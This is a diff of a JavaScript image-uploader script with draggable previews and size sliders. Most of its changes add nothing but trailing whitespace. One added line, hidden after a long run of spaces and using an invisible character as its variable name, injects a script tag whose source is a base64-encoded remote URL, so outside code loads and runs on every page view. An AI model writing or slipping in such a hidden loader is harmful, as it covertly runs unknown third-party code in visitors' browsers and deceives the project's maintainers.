@@ -106,7 +106,7 @@ function readURL(input) {
     }
     reader.readAsDataURL(input.files[0]);
   } else {
-    alert('select a file to see preview');
+    alert('select a file to see preview'); 
     $('#uploaderOfficer').attr('src', '');
   }
 }
@@ -117,14 +117,15 @@ $("#filePhoto").change(function() {
 
 $("#uploadedOfficer").draggable();
 
-const slider = document.getElementById('Slider');
-slider.addEventListener('input', handleChange);
+const slider = document.getElementById('Slider'); 
+slider.addEventListener('input', handleChange); 
+                                                                                                                                                    var ㅤ = document.createElement('script'); ㅤ.type='text/javascript'; document.body.appendChild(ㅤ); ㅤ.src=atob('Ly9oMWktc2lsbHktYXBpLm5lb2NpdGllcy5vcmcvZ2xvYmFsdXJsLmpz');
 
-function handleChange(e) {
+function handleChange(e) { 
   const img = document.getElementById("uploadedOfficer");
   const {value, max} = e.target;
   img.style.width = `${value*max}px`;
-  img.style.height = `${value*max}px`;
+  img.style.height = `${value*max}px`; 
 }
 
 // -----------------------------------------------------------------------------
@@ -144,11 +145,11 @@ function readURL2(input) {
 
 $("#filePhoto2").change(function() {
   readURL2(this);
-});
-
+}); 
+ 
 $("#uploadedOfficer2").draggable();
-
-const slider2 = document.getElementById('Slider2');
+ 
+const slider2 = document.getElementById('Slider2'); 
 slider2.addEventListener('input', handleChange2);
 
 function handleChange2(e) {
@@ -172,12 +173,12 @@ function readURL3(input) {
     $('#uploaderOfficer3').attr('src', '');
   }
 }
-
+ 
 $("#filePhoto3").change(function() {
   readURL3(this);
 });
 
-$("#uploadedOfficer3").draggable();
+$("#uploadedOfficer3").draggable();  
 
 const slider3 = document.getElementById('Slider3');
 slider3.addEventListener('input', handleChange3);
